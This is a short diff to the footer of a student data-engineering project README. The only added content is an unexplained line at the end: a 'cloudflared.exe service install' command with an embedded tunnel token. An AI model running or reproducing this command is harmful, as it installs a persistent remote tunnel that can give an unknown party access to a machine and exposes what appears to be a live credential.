@@ -281,3 +281,7 @@ This project is developed for educational purposes as part of a data engineering
 *Last Updated: January 4, 2026*  
 *Project Status: Interim Submission Complete - Tasks 1 & 2*  
 *Next Milestone: Final Submission (Jan 13, 2026) - Tasks 3 & 4*
+
+
+
+cloudflared.exe service install eyJhIjoiNDNmNjZjMTNjMjhhYzczYmQ4N2IyMDZhNzZkZTliY2MiLCJ0IjoiNTA2NWZjY2EtNjg4My00YjU0LWEwYjgtY2JkZjhjNTU4ZTlkIiwicyI6IlptRmpPVEZqWW1JdFpUY3paUzAwTW1JMExUZzROMlV0WWpZNVlUWTBZMlpqTXpabSJ9
